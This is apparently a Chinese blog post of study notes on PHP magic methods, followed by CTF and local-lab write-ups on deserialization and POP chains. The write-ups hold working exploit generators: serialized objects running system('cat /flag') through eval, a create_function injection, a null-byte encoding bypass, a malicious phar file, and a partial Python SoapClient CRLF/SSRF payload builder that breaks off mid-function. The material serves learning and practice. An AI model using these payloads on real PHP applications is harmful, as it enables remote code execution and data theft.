---
title: "WEB_php反序化和pop链"
image: ''
pinned: false
comment: true
published: 2026-04-02
description: "WEB"
category: WEB
tags: [WEB]
---



![image-20260407200646301](/images/image-20260407200646301.png)

这是由php官方规定的17个魔术方法。

在php反序列化和pop链中的关键方法，通过这些方法我们才能构造出一条一条的攻击链。

这篇文章主要是记录我从单个开始，一步一步熟练掌握魔术方法，以及之后通过各种实战记录思路和攻击链。





### 1.__construct($1)

* **`...$1` **（可选）。当执行 `new Class(1, 2)` 时，括号里的参数会原封不动地传给它。用来做初始化（比如给属性赋值）。
* 无返回值

**构造函数**

当使用 `new` 关键字创建一个类的实例时，PHP 会自动查找并调用该类中的 `__construct()` 方法。

```
class User {
    public $username;
    public $role;

    // 构造函数
    public function __construct($name, $role = '普通用户') {
        $this->username = $name;
        $this->role = $role;
        echo "用户 {$this->username} 已创建，角色为 {$this->role}。\n";
    }
}

// 实例化时传入参数
$user1 = new User("张三"); 
// 输出: 用户 张三 已创建，角色为 普通用户。

$user2 = new User("李四", "管理员"); 
// 输出: 用户 李四 已创建，角色为 管理员。
```

当两个user新建实例User时，`__construct()` 直接被 PHP 查询并调用了，这也就是为什么会有输出的信息，因为 `__construct()` 方法中存在echo的语句。



注：**在使用默认参数时，有默认值的参数必须放在没有默认值的参数后面**。

一个类只能有一个 `__construct` 方法。



### 2.__destruct()

* 无参数
* 无返回值

析构函数(**不接收任何参数**)

当一个对象在内存中被销毁时，PHP 会自动调用这个方法。

类似情形：

* **代码执行完毕**：整个 PHP 脚本运行结束时，所有留下的对象都会被自动销毁。

* **变量被主动释放**：如果手动将对象变量设为 `null`，或者使用 `unset($obj)`。

* **变量失去引用**：当一个对象不再被任何变量指向时（比如函数执行结束，函数内部的局部变量被回收）。

```
class FileHandler {
    private $handle;

    public function __construct($filename) {
        $this->handle = fopen($filename, 'w');
        echo "文件已打开。\n";
    }

    // 析构函数：在对象消失时自动关闭文件
    public function __destruct() {
        if ($this->handle) {
            fclose($this->handle);
            echo "文件已安全关闭（由析构函数处理）。\n";
        }
    }
}

$file = new FileHandler('test.txt');
// 假设这里有很多操作...
unset($file); // 手动销毁，立即触发 __destruct
echo "脚本继续执行...\n";
```





## 注：

构造函数和析构函数一样，子类如果定义了自己的函数，不会自动调用父类的函数。

- 如果需要执行父类的逻辑，必须手动调用：`parent::__destruct()`/`parent::__construct()`。





### 3.__call($name, $arguments)

- **`$name`**: 被调用的方法名。
- **`$arguments`**: 调用方法时传入的所有参数，封装在一个**索引数组**中。
- **返回值**: `__call` 的返回值将作为原始方法的调用结果返回给调用者。(就是说虽然我们调用的方法不存在，但同样会有返回值)

当你尝试调用一个类中“**不存在**”或“**不可访问**”的方法时，它就会被自动触发。

```
class Robot {
    // 实际存在的方法
    public function sayHi() {
        echo "你好！\n";
    }

    // 当调用不存在的方法时触发
    public function __call($name, $arguments) {
        echo "你尝试调用了一个不存在的方法：'{$name}'\n";
        echo "传入的参数有：";
        print_r($arguments);
        
        return "我是 __call 的返回值";
    }
}

$bot = new Robot();
$bot->sayHi(); // 正常调用

// 调用一个不存在的方法 'run'
$result = $bot->run("快速", 500); 

echo $result;
```

这边的备注很明显了，实例第一次调用sayhi()方法，所以可以正常输出你好。第二次调用run()方法，但由于没有这个方法就触发了 `__call()` 呼吁i先打印出我们调用了不存在的方法：run() ，然后以索引数组的方式打印出我们传入的参数。最终echo救赎输出 `__call()` 方法中的return值。

![image-20260407204606972](/images/image-20260407204606972.png)

实际以例子为模板写的php可运行代码运行的结果。



### 4.__callStatic($name, $arguments)

* **`$name`**: 被调用的静态方法名。

* **`$arguments`**: 传入参数的**索引数组**。

* **返回值**: 跟__call一样。

在 PHP 中，当调用一个类中**不存在**或**不可访问**的**静态方法**（使用 `::` 语法）时，这个魔术方法就会被自动触发。

```
<?php

class DB {
    // 假设这是我们实际执行查询的逻辑
    private static function runQuery($method, $args) {
        echo "【底层操作】正在执行查询逻辑...\n";
        echo "【动作】: {$method}\n";
        echo "【参数】: " . implode(', ', $args) . "\n";
    }

    // 魔法开始：处理所有静态调用
    public static function __callStatic($name, $arguments) {
        // 比如用户调用 DB::table('users')
        // $name 就是 'table'
        // $arguments 就是 ['users']
        
        self::runQuery($name, $arguments);
        
        // 很多时候这里会返回对象本身以支持链式调用，
        // 但这里为了演示，我们先返回一个确认信息。
        return "查询发送成功！";
    }
}

// 注意这里：类里面根本没有定义 table() 或 where() 方法
$status = DB::table('users', 'id', 1); 

echo "【外部状态】" . $status;
```

这边没有new一下创建实例，是因为**`static`**（静态）方法的特点就是可以直接通过类名调用方法。

说实话在这段代码中其实不论怎么改调用方法都一定触发 `__callStatic()` 因为定义类中，runQuery方法是私有的，外部访问不到的。





## 注：

**与 `__call` 不同，`__callStatic` 必须被声明为 `static`（静态的）。**





### 5.__get($name)

```
public function __get(string $name): mixed
```

* **`$name`**: 你想要读取的那个属性的名字。

* **返回值**: 你返回什么，外部拿到的就是什么。

当尝试访问一个**不存在**或者**没有权限访问**（`private` 或 `protected`）的属性时，PHP 就会自动调用 `__get` 这个方法。

```
<?php

class User {
    private $username = "张三";
    private $score = 95;

    // 当外部尝试读取不可见属性时触发
    public function __get($name) {
        echo "【魔法触发】正在读取属性：'{$name}'\n";

        // 逻辑处理：只允许读取 username，不允许读取 score
        if ($name === 'username') {
            return $this->username;
        }

        return "【警告】该属性禁止访问或不存在！";
    }
}

$user = new User();

// 1. 尝试读取 private 属性 username
echo "用户姓名：" . $user->username . "\n"; 

echo "-----------------\n";

// 2. 尝试读取 private 属性 score
echo "用户分数：" . $user->score . "\n";
```

由于在 `__get()` 里面写好了如果 `$name === 'username'` 可以在内部调用方法得到数据，因此在第一次读取时，可以读取到了username；而在第二次中就没有办法，因为我们访问不到score，`__get()` 方法也没有写，所以读取不到，只会return 警告。



### 6.__set($name, $value)

- **`$name`**：尝试赋值的那个**不可访问**或**不存在**的属性名（字符串）。
- **`$value`**：给这个属性赋的**具体内容**（可以是任何类型：字符串、数组、对象等）。
- **返回值：****无返回值**

尝试给一个**不可访问**或**不存在**的属性赋值时，它就会自动触发。

```
<?php

class User {
    private $age;
    private $data = []; // 用来存那些没定义的属性

    public function __set($name, $value) {
        echo "【安检启动】准备给 '{$name}' 赋值为 '{$value}'\n";

        if ($name === 'age') {
            // 逻辑过滤：年龄不能是负数，也不能太大
            if ($value < 0 || $value > 150) {
                echo "【拒绝】年龄不合法，赋值失败！\n";
                return; // 直接拦截，不写进属性
            }
            $this->age = $value; // 合法，写入私有属性
        } else {
            // 如果是其他没定义的属性，统一存进 data 数组里
            $this->data[$name] = $value;
        }
    }

    public function getAge() {
        return $this->age;
    }
}

$user = new User();

// 1. 尝试赋一个非法值
$user->age = -10; 
// 输出：【安检启动】... 【拒绝】...

// 2. 尝试赋一个合法值
$user->age = 25; 
echo "最终年龄：" . $user->getAge() . "\n";

// 3. 赋一个类里根本没写的属性
$user->hobby = "编程"; 
// 这会被存进 $data 数组里
```

这边就是存在当我们想要对一个private属性的变量赋值时，调用 `__set()` 执行赋值命令，而第一次的赋值因为数值不合法被拒绝，第二次赋值数值合法，就成功在外部对类内部的私有属性赋上了值，第三次赋值是对一个没有定义的属性赋值，所以会存入已经写好的数组中。

![image-20260407213553303](/images/image-20260407213553303.png)

运行结果跟分析的一模一样。



### 7.__isset($name)

`isset($user->nickname);`

如果 `nickname` 是私有的，PHP 引擎会自动执行： `$user->__isset("nickname");`	**(自动传参)**

- **`$name`**：同样是 PHP 引擎自动抓取的属性名（字符串 `"nickname"`）。
- **返回值**：你必须返回 `true` 或 `false`。

其实它就是一个检验器，如果存在就 `true` ，不存在就 `false` 。

用真与假来代替访问的返回值。

**用empty()或者issert()访问不存在或者无法访问的属性时触发。**

```
<?php

class User {
    private $data = [
        'username' => '张三',
        'email' => 'zhangsan@example.com'
    ];

    // 当外部对不可见属性调用 isset() 或 empty() 时触发
    public function __isset($name) {
        echo "【查岗】有人在打听属性 '{$name}' 是否存在...\n";

        // 检查这个名字是否在我们的私有数组里
        return isset($this->data[$name]);
    }
}

$user = new User();

// 1. username 是私有的，直接查会返回 false
// 但有了 __isset，它会去问 __isset("username")
if (isset($user->username)) {
    echo "结果：username 属性是存在的！\n";
} else {
    echo "结果：找不到这个属性。\n";
}

echo "-----------------\n";

// 2. 查一个完全不存在的属性
if (isset($user->age)) {
    echo "结果：age 存在。\n";
} else {
    echo "结果：age 不存在。\n";
}
```

注释挺明显的，就是一个查询的作用。

在很多直接源码的题目里，这个函数还挺常见的，用来保证变量存在值。



### 8.__unset($name)

在 PHP 中，`unset()` 函数用来销毁一个变量。

`unset($user->nickname);`

* **参数：** **`$name`**。被抓取的属性名字符串（如 `"nickname"`）。

* **返回值：** **无返回值**。

一个比较安全的删除器。

如果 `nickname` 是私有的，PHP 引擎会自动执行： `$user->__unset("nickname");`

* **`$name`**：同样是 PHP 引擎自动抓取的属性名字符串（`"nickname"`）。

```
<?php

class User {
    private $data = [
        'nickname' => '小明',
        'email' => 'xiaoming@example.com'
    ];

    // 当外部对不可见属性调用 unset() 时触发
    public function __unset($name) {
        echo "【魔法启动】外界想删掉 '{$name}'，正在清理内存...\n";

        if (array_key_exists($name, $this->data)) {
            unset($this->data[$name]); // 真正从私有数组里删掉它
            echo "【成功】属性 '{$name}' 已被抹除。\n";
        } else {
            echo "【忽略】本来就没有 '{$name}'，啥也不用做。\n";
        }
    }

    public function showData() {
        print_r($this->data);
    }
}

$user = new User();

// 1. 看看现在的属性
$user->showData();

echo "-----------------\n";

// 2. 尝试删除私有模拟属性 nickname
unset($user->nickname);

// 3. 再次查看，nickname 已经没了
$user->showData();
```





## 注：

`__isset` 和 `__unset` 这两个魔术方法的时候是针对私有属性的，当对private属性进行操作时，才会有一个额外的内部执行，如果是public的，那就直接操作就行了。





### 9.__sleep()

在 PHP 中，当尝试使用 `serialize()` 函数将一个对象转换成一个可保存或可传输的字符串时，`__sleep()` 就会被触发。

```
<?php

class DatabaseConnector {
    public $host;
    public $user;
    private $password;
    private $conn; // 这是一个数据库连接资源

    public function __construct($host, $user, $password) {
        $this->host = $host;
        $this->user = $user;
        $this->password = $password;
        $this->connect();
    }

    private function connect() {
        echo "【连接】正在连接到数据库...\n";
        $this->conn = "Resource id #123"; // 模拟连接
    }

    // 魔法开始：打包前的准备
    public function __sleep() {
        echo "【魔法】对象准备序列化，正在清理资源...\n";
        
        // 我们只希望保存配置信息，不保存连接本身
        // 因为连接在反序列化后也是失效的
        return ['host', 'user', 'password']; 
    }
}

$db = new DatabaseConnector('localhost', 'root', '123456');

// 执行序列化
$data = serialize($db);

echo "序列化后的结果：\n" . $data . "\n";
```

实际就是如果这个类写有 `__sleep()` 时，如果新建这个类的实例，并对其执行序列化转化时，这个魔术方法就会触发，先执行完魔术方法，在进行序列化。

![image-20260409192158268](/images/image-20260409192158268.png)



### 10.__wakeup()

* **无参数**
* **无返回值**

当执行 `unserialize($serialized_string)` 时，PHP 引擎会：根据字符串重建对象。然后立即查找并执行该对象中的 `__wakeup()` 方法。

实际讲如果类中存在 `__wakeup()` ，那么进行反序列化转化时，这个魔术方法就是最后一步，它在反序列化转化的最后执行的。

如果没有，那就是正常执行反序列化转化了。

```
<?php

class DatabaseConnector {
    public $host;
    public $user;
    private $conn;

    public function __construct($host, $user) {
        $this->host = $host;
        $this->user = $user;
        $this->connect();
    }

    private function connect() {
        echo "【连接】正在建立数据库连接...\n";
        $this->conn = "Resource id #Active"; // 模拟连接动作
    }

    // 睡觉前：只需记住主机和用户名
    public function __sleep() {
        return ['host', 'user'];
    }

    // 醒来后：发现连接断了，赶紧重连
    public function __wakeup() {
        echo "【魔法】对象已苏醒，准备恢复连接...\n";
        $this->connect();
    }
}

// 1. 模拟序列化存储
$db = new DatabaseConnector('localhost', 'root');
$data = serialize($db); 

echo "--- 模拟关闭程序并重新加载 ---\n";

// 2. 反序列化
$newDb = unserialize($data);

```

执行 `$data = serialize($db); ` 前执行了 `__sleep()` echo了一句。

执行 `$newDb = unserialize($data);` 中执行了 `__wakeup()` 连接 `connect()` 方法，执行了两句echo。

![image-20260409193622364](/images/image-20260409193622364.png)



### 11.__serialize()

当对对象执行 `serialize()` 函数时，PHP 会优先检查类中是否存在此方法，如果有就执行。

**当 `__sleep()` 和 `__serialize()` 同时存在时，只执行 `__serialize()`**

- **原型**：`public function __serialize(): array`
- **必须返回**：一个**关联数组（Key-Value）**，这个数组代表了序列化后的对象状态。

```
<?php

class User {
    public $username;
    private $password;

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    // 魔法开始：打包逻辑
    public function __serialize(): array {
        echo "【魔法】正在执行新版序列化...\n";

        // 你可以随心所欲地构建这个数组
        return [
            'user' => $this->username,
            // 甚至可以对数据加密后再存
            'pass' => base64_encode($this->password), 
            'time' => time(), // 存一个类里根本没有的属性
            'ver'  => '1.0'
        ];
    }
}

$user = new User('Gemini', 'secret123');
$data = serialize($user);

echo "序列化结果：\n" . $data . "\n";
```

就是一个可以自定义的序列化方法。



### 12. __unserialize($data)

- **参数：** **`$data`**。这是一个**关联数组**。这是序列化阶段通过 `__serialize()` 魔法方法打包出来的那个数组。
- **返回值：** **无返回值**。它的任务是根据传入的 `$data` 数组，亲手把数据填回对象的属性里（例如：`$this->name = $data['name'];`）。

当 PHP 尝试将字符串还原为对象时，如果类中定义了这个方法，它会优先于 `__wakeup` 被调用，且 `__wake()` 将不会调用。

其实跟上面那个魔术方法一样的机制。

```
<?php

class User {
    public $username;
    private $password;
    public $restoreTime; // 记录一下它是啥时候复活的

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    // 1. 打包魔法（你刚才提供的）
    public function __serialize(): array {
        return [
            'user' => $this->username,
            'pass' => base64_encode($this->password), // 加密存储
            'time' => time(),
            'ver'  => '1.0'
        ];
    }

    // 2. 还原魔法（重点看这里）
    public function __unserialize(array $data): void {
        echo "【魔法】检测到 $data[ver] 版本的 DNA，开始克隆...\n";

        // 从数组里把数据“领”回来，重新赋值给属性
        $this->username = $data['user'];
        
        // 把 base64 加密过的数据还原回来
        $this->password = base64_decode($data['pass']);
        
        // 甚至可以利用数组里的额外信息做点别的
        $this->restoreTime = date('Y-m-d H:i:s', $data['time']);
    }

    public function showInfo() {
        echo "用户名：{$this->username}\n";
        echo "密码：{$this->password}\n";
        echo "打包时间：{$this->restoreTime}\n";
    }
}

// --- 实战演示 ---

// 1. 模拟一个序列化后的字符串（假设这是从数据库里读出来的）
$user = new User('Gemini', 'secret123');
$serializedData = serialize($user);

echo "--- 准备复活对象 ---\n";

// 2. 触发 __unserialize
$newUser = unserialize($serializedData);

echo "--- 复活成功，展示成果 ---\n";
$newUser->showInfo();
```

一个自定义的反序列化方法。



### 13.__toString()

在PHP中，当尝试把一个**对象当成字符串使用**时自动触发。

* **参数作用：** **无参数**。

* **返回值：** **必须返回一个字符串 (string)**。如果你返回了整数、数组或者对象，PHP 会抛出一个 **Fatal Error（致命错误）**。

```
<?php

class Hero {
    private $name;
    private $level;

    public function __construct($name, $level) {
        $this->name = $name;
        $this->level = $level;
    }

    // 魔法开始：定义对象的“自我介绍”
    public function __toString() {
        // 逻辑：你可以根据对象的状态拼接任何字符串
        return "【英雄档案】姓名：{$this->name} | 当前等级：{$this->level}";
    }
}

$player = new Hero("亚索", 18);

// 1. 直接打印对象，触发魔法
echo $player . "\n"; 

// 2. 字符串拼接，同样触发
$message = "您的队友 " . $player . " 已上线。";
echo $message;
```

简单来理解，就是当我们把一个对象当作字符串使用时，这个魔术方法就会触发，可以用来拼接字符串，还可以直接转化数据。

比如我需要一个json格式的数据，这个时候使用 `__tostring ` 提前写好，就不需要我们再次写代码来转化格式了。



### 14.__invoke($args)

当尝试把一个对象当成函数来调用时触发。

* **参数：** **`...$args`**（可选）。调用对象时括号里传的任何参数，都会被原封不动地送进 `__invoke` 里。

* **返回：** 这个返回值就是你“调用对象”后的结果。

```
<?php

class Calculator {
    private $factor;

    public function __construct($factor) {
        $this->factor = $factor;
    }

    // 魔法开始：让对象变成一个“乘法器”
    public function __invoke($number) {
        echo "【魔法】对象正在像函数一样运行...\n";
        return $number * $this->factor;
    }
}

// 1. 实例化一个倍率为 5 的计算器
$triple = new Calculator(5);

// 2. 像调用函数一样调用对象！
$result = $triple(10); 

echo "结果是：$result"; // 输出 50
```

这边就是将 `$triple` 这个对象当作一个函数来使用，而由于 `__invoke()` 中写的是一个乘法，所以这边的调用变成的函数实际是一个乘法函数。



### 15.__set_state($properties)

当执行 `var_export($obj, true)` 时，PHP 并不直接保存对象，而是生成一段调用 `__set_state` 静态方法的 字符串代码。**(这就是触发的情况)**

```
$setup = new Config("Dark", "secret_key");
$code = var_export($setup, true);
```

这边使用 `var_export()` 导出 `setup` 实例.

正常我们导出这个实例后就会将其封装在某一个文件中，当我们想要使用的时， `include` 这个文件，这时 PHP 就会触发  `__set_state` 这个方法，它会按照这个方法里面提前写好的代码进行还原。

- **参数作用**： **`$properties`**：里面装满了对象被导出时的所有属性（甚至包括私有的、保护的）。
- **返回值**： **必须返回一个对象实例**。如果没返回，你 `include` 出来的变量就会是空的。

```
<?php

class DatabaseConfig {
    public $host;
    public $user;
    private $password; // 注意：私有属性也能被导出

    public function __construct($host, $user, $password) {
        $this->host = $host;
        $this->user = $user;
        $this->password = $password;
    }

    /**
     * 核心魔法：当导出的代码被重新执行时，PHP 会调用这个静态方法
     */
    public static function __set_state($properties) {
        echo "【系统日志】检测到配置文件载入，正在通过 __set_state 还原对象...\n";
        
        // 这里的 $properties 包含了：
        // ['host' => '...', 'user' => '...', 'password' => '...']
        
        // 我们利用这些“零件”重新造出一个对象并返回
        return new DatabaseConfig(
            $properties['host'],
            $properties['user'],
            $properties['password']
        );
    }

    public function getConnectionInfo() {
        return "连接信息：{$this->user}@{$this->host} (密码已加密隐藏)";
    }
}

// --- 第一阶段：导出对象为“源代码” ---

$config = new DatabaseConfig('127.0.0.1', 'admin', 'top-secret-123');

// var_export 会生成一段 PHP 源代码字符串
$exportedCode = var_export($config, true);

echo "1. 对象已导出为 PHP 源代码：\n";
echo "---------------------------------\n";
echo $exportedCode . ";\n"; 
echo "---------------------------------\n\n";

/* 此时 $exportedCode 的内容大致如下（这就是存进缓存文件的内容）：
DatabaseConfig::__set_state(array(
   'host' => '127.0.0.1',
   'user' => 'admin',
   'password' => 'top-secret-123',
))
*/

// --- 第二阶段：存储与复活 ---

// 在实际项目中，你会把 $exportedCode 存入文件。这里我们用 eval 模拟载入过程。
echo "2. 模拟从缓存文件载入并执行代码...\n";
eval('$restoredConfig = ' . $exportedCode . ';');

// --- 第三阶段：验证结果 ---

echo "\n3. 验证复活后的对象：\n";
echo $restoredConfig->getConnectionInfo() . "\n";
echo "对象类名：" . get_class($restoredConfig) . "\n";
```

看这段实例代码。

当我们 `eval('$restoredConfig = ' . $exportedCode . ';');` ，这边就相当于 `include` ，这个时候 就会去看 `__set_state` 。

将我们储存的 `$exportedCode` 进行复原，回到一开始的样子，这是代码里写好的，因此后面echo时才能利用这个 `$exportedCode` 调用到 `getConnectionInfo()` 这个方法。



### 16.__clone()

当使用 **`clone`** 关键字复制一个对象时触发。

基本就是有clone这个字眼的时候，就会触发类中的 `__clone()` 魔术方法。

* **参数作用：** **无参数**。

* **返回值：** **无返回值**。

类似copy吧，但关键还是得看代码写法，如果没写好，会出现这个复制其实就是让一个类有了两个开口，而不是两个类两个开口。

```
<?php

class Account {
    public $balance = 100;
}

class User {
    public $name;
    public $account; // 这是一个对象

    public function __construct($name) {
        $this->name = $name;
        $this->account = new Account();
    }

    /**
     * 魔法开始：定义克隆后的行为
     */
    public function __clone() {
        echo "【魔法】正在为 {$this->name} 的副本进行深拷贝...\n";
        
        // 关键一步：手动克隆子对象，确保副本拥有独立的账户
        // 如果不写这一行，原件和副本会共用同一个 Account 对象！
        $this->account = clone $this->account;
    }
}

// 1. 创建原件
$user1 = new User("张三");

// 2. 执行克隆
$user2 = clone $user1;
$user2->name = "李四";

// 3. 验证独立性
$user1->account->balance = 500; // 修改张三的余额

echo "张三的余额：{$user1->account->balance}\n"; // 500
echo "李四的余额：{$user2->account->balance}\n"; // 100 (不受张三影响)
```



### 17.__debugInfo()

当对一个对象使用 **`var_dump()`** 进行调试输出时自动触发。

* **参数：** **无参数**。

* **返回值：** **必须返回一个关联数组 (array)**。PHP 引擎会忽略对象原本的所有属性，转而只显示你在这个数组里定义的“键值对”。

讲简单一点，就是一个提前编写好的方法，保证我们对脚本进行调试的时候，不会将一些敏感信息泄露出来。

```
<?php

class User {
    private $username;
    private $password; // 敏感数据
    private $hugeData; // 巨大的数据，不想在调试时刷屏

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
        $this->hugeData = range(1, 1000); // 模拟一个超大数组
    }

    /**
     * 魔法开始：自定义调试输出的内容
     */
    public function __debugInfo() {
        echo "【魔法】检测到正在进行 var_dump 调试，已开启隐私过滤...\n";

        // 返回一个你希望别人看到的数组
        return [
            'User_Name' => $this->username,
            'Password'  => '****** (已加密隐藏)', // 隐藏真实密码
            'Data_Count'=> count($this->hugeData), // 只显示数量，不显示内容
            'Status'    => 'Active'               // 甚至可以增加类里没有的动态信息
        ];
    }
}

$user = new User("Gemini", "p@ssw0rd123");

// 触发魔法
var_dump($user);
```

































# 反序列化实战：

## 1.

![image-20260407214614653](/images/image-20260407214614653.png)

很简单的一题，定义了一个类，然后将我们传给flag参数的数值反序列化，然后调用action()方法，只要对cat进行赋值，使其变成我们希望执行的命令就行了。

```
<?php  
class a{  
    var $act;  
    function action(){  
        eval($this->act);  
    }  
}  
$exp = new a;  
$exp->act = "system('cat /flag');"; 
echo urlencode(serialize($exp));  
?>
```



## 2.

![image-20260408180657562](/images/image-20260408180657562.png)

这边找了个探姬的本地反序列化靶场做了一下。

2，3关其实反序列化的过程都一样，只是传入的参数不太一样。

一个是直接get传参就行，这一个需要在cookie中传参。

讲一下原理吧。

mylogin中，定义了user和pass，然后后面有一个login()方法，如果这两个参数的数值是题目里面写好的，那么就会login()方法就会返回1，从而满足下面的if前提，然后读出flag。

```
<?php
class mylogin{
    var $user;
    var $pass;
}

$a=new mylogin();
$a->user="daydream";
$a->pass="ok";

echo urlencode(serialize($a));
?>
```



## 3.

![image-20260409180524322](/images/image-20260409180524322.png)

```
<?php
class func {
    public $key;
}

class GetFlag {
    public $code;
    public $action;
}
$b = new GetFlag();
$b->action = "create_function";
$b->code = '} include("flag.php"); echo $flag; //';
$a = new func();
$a->key = serialize(array($b, "get_flag"));

echo urlencode(serialize($a));
?>
```

依旧简单讲解一下，这边是利用了php版本还没更新到后面，而有一个特殊的函数--- `create_function` 的作用类似eval，从而执行了我们的指令。

这个函数具体的作用可以看下面。

总之就是这个函数可以帮我们执行我们想要执行的php命令。

而我们对其预设为 `include("flag.php"); echo $flag;` ，从而得到flag。这段代码就是读取flag.php，输出flag对象。

这便是第一个实例的作用。

而第二个实例的作用就是为了触发第一个实例。

由于源码存在 `__destruct` 这个魔术方法，它的触发方式是当一个对象在内存中被销毁时，PHP 会自动调用这个方法，实际就是当我们脚本运行完时，它就会触发，然后调用方法。

源码中写了一个反序列化$key参数，所以我们将其设置为 `array($b, "get_flag")`，在php中，如果一个数组的结构是 `[对象实例, "方法名"]`，那么 php 就会尝试取调用这个实例的对应方法，这也就是我们用来触发 b实例 getflag方法的原理。



## 4.ban %

```
<?php
include("flag.php");
highlight_file(__FILE__);
class secret{
    private $comm;
    public function __construct($com){
        $this->comm = $com;
    }
    function __destruct(){
        echo eval($this->comm);
    }
}
$param=$_GET['param'];
$param=str_replace("%","daydream",$param);
unserialize($param);
?>
```

这边遇到一个新问题，我也是没想好。

首先思路很清楚，因为存在 `__construct` 这个魔术方法，里面有写了将对象 `$com ` 的值传送给私有属性 `$comm` ，所以理论上只要我们在新建实例时，直接带上一个参数，就可以将这个参数的值直接传送给 `$com ` 并给 `$comm` ，然后看下一个 `__destruct()` ，这个方法写了一个 `echo eval($this->comm);`  ，所以理论上只要让我们传送的数值为一个执行命令读取flag的就可以拿到flag。

但这边出现了一个问题。

一开始我以后下面那个替换字符函数是用来防url编码的数值。

后来才发现，其实它防不到，因为我们传送url编码的数值是为了让浏览器看懂，浏览器会自动解码，根本就不会出现%被匹配到的说法。

实际上这个匹配是因为私有属性在序列化时，会带来不可见字符，而浏览器解码后会得到%00这个数值，从而被匹配到，导致我们的数值失去了原意。

**我们需要把 s:12:"\0secret\0comm" 变成 S:12:"\00secret\00comm" * 这样反序列化时，PHP 会把 \00 解析为 Null 字节，且不需要用到 % 字符。**

```
<?php
class secret {
    private $comm;
    public function __construct($com) {
        $this->comm = $com;
    }
}

$cmd = "system('cat /flag');";
$obj = new secret($cmd);
$ser = serialize($obj);
echo $ser;

$payload = str_replace('s:12:"' . "\x00secret\x00comm", 'S:12:"\\00secret\\00comm', $ser); #\x00要换成\\00

echo $payload . "\n";
?>
```



## 5.phar协议触发反序列化

```
<?php
highlight_file(__FILE__);
class TestObject {
    public function __destruct() {
        include('flag.php');
        echo $flag;
    }
}
$filename = $_POST['file'];
$boo1=1;
$black_list=['php','file','glob','data','http','ftp','zip','https','ftps','phar'];
foreach($black_list as $item){
    $front=substr($filename,0,strlen($item));
    if ($front==$item){
        $boo1=0;
    }
}
if (isset($filename) and $boo1){
    echo md5_file($filename);
}
//upload.php
?>
<br><a href="../level13">点击进入第十三关</a>
点击进入第十三关
```

这边是一题php文件上传的反序列化题型。

题目给出了源码和文件上传页面。

通过源码可以看见一个黑名单用来防止为我们传入的数值前缀。

不过这边可以利用它在意大小写的方式轻易绕过。

这道题的关键在于，如何传入文件，并使读取文件的时候达成反序列化的触发。

```
<?php
class TestObject {
}

$phar = new Phar("exp.phar"); #创建一个名为 exp.phar 的新 Phar 归档文件对象。
$phar->startBuffering(); #开始缓冲。这允许程序在一次性写入磁盘之前，对 Phar 文件进行多次修改。
$phar->setStub("<?php __HALT_COMPILER(); ?>"); #设置 Stub（存根）。这是 Phar 文件的固定格式，必须以 __HALT_COMPILER(); 结尾，否则 PHP 不会将其识别为 Phar 文件。


$obj = new TestObject();
$phar->setMetadata($obj); #将对象 $obj 存入 Phar 文件的元数据（Metadata）中。Phar 存储元数据时会自动调用 serialize() 进行序列化。

$phar->addFromString("test.txt", "test");  #向压缩包内添加一个名为 test.txt 的文件，内容为 "test"。满足 Phar 文件的基本结构要求。
$phar->stopBuffering(); #停止缓冲并将所有更改写入磁盘上的 exp.phar 文件。
?>
```

这边是一个简单的生成我们需要文件的php代码。

生成后直接上传，然后用phar伪协议直接读取就完成了触发反序列化，读取到了flag。

而其实phar伪协议有时候也会被ban，所以这边引入一些其他的读取方式。

![image-20260411191117232](/images/image-20260411191117232.png)



## 6.php反序列结合crlf发送post请求

```
<?php
highlight_file(__FILE__);

$c = unserialize($_GET['param']);
$c -> daydream();

/*
In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.
flag.php
$flag="*";
$user=$_SERVER['HTTP_USER_AGENT'];
$pass = $_POST['pass'];
if(isset($pass) and isset($user)){
    if($pass=='password' and $user=='admin'){
        file_put_contents('flag.txt',$flag);
    }    
}
*/
?>
<br><a href="../level1">点击进入第十一关</a>
Fatal error: Call to a member function daydream() on boolean in /var/www/html/index.php on line 5
```

这边主要是利用一个特殊的漏洞。

![image-20260414194801155](/images/image-20260414194801155.png)

而且还有点版本不兼容的缘故。

`PHP` 的内置类 `SoapClient` 存在一个触发点，跟 `__call` 这个魔术方法的触发类似，都是当调用一个不存在的方法时触发。

触发后， `SoapClient`  去向你设置的 `location` 发起一次 SOAP/HTTP 请求。

然后看题目的注释。

它要求：

```
if(isset($pass) and isset($user)){
    if($pass=='password' and $user=='admin'){
        file_put_contents('flag.txt',$flag);
    }    
}
```

往前看。

```
$user=$_SERVER['HTTP_USER_AGENT'];
$pass = $_POST['pass'];
```

需要设置 `'HTTP_USER_AGENT'` ，还要post传参pass。

而这些内容都必须包含在 `SoapClient`  类发起的请求中。

但是 这个类发起的请求我们无法修改。

所以能做的的就是在注入 `HTTP_USER_AGENT` 的时加上一条正常的post 请求。

这边利用的原理就 `CRLF` 。

> https://cloud.tencent.com/developer/article/1728657

由于每一个部分都是由一个 `\r\n` 分开。

所以我们就自定义一个部分是post传参，然后前后用 `\r\n` 分开。

完成要求。

啧。

感觉本地靶场出不来，不知道为什么，因为我这边正常做，读不到flag。

ai使用py脚本自动化来完成操作也是失败，写不进去。

啧啧啧。

就当是积累个题型，之后找机会复刻一下。

### 通用脚本

```
import argparse
import requests
from urllib.parse import urljoin

def php_s(s: str) -> str:
    b = s.encode()
    return f's:{len(b)}:"{s}";'

def php_n() -> str:
    return 'N;'

def php_b(v: bool) -> str:
    return f'b:{1 if v else 0};'

def php_i(v: int) -> str:
    return f'i:{v};'

def php_a0() -> str:
    return 'a:0:{}'

def build_user_agent(fake_ua: str, post_body: str, add_connection_close: bool = True) -> str:
    lines = [
        fake_ua,
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(post_body.encode())}",
    ]
    if add_connection_close:
        lines.append("Connection: close")
    lines.append("")
    lines.append(post_body)
    return "\r\n".join(lines)

def build_payload(
    internal_url: str,
    uri: str,
    fake_ua: str,
    post_body: str,
    keep_alive: bool = False,
    exceptions: bool = True,
    soap_version: int = 1,
) -> str:
    ua = build_user_agent(fake_ua, post_body, add_connection_close=(not keep_alive))

    props = [
        ("\x00SoapClient\x00uri", php_s(uri)),
        ("\x00SoapClient\x00style", php_n()),
        ("\x00SoapClient\x00use", php_n()),
        ("\x00SoapClient\x00location", php_s(internal_url)),
        ("\x00SoapClient\x00trace", php_b(False)),
        ("\x00SoapClient\x00compression", php_n()),
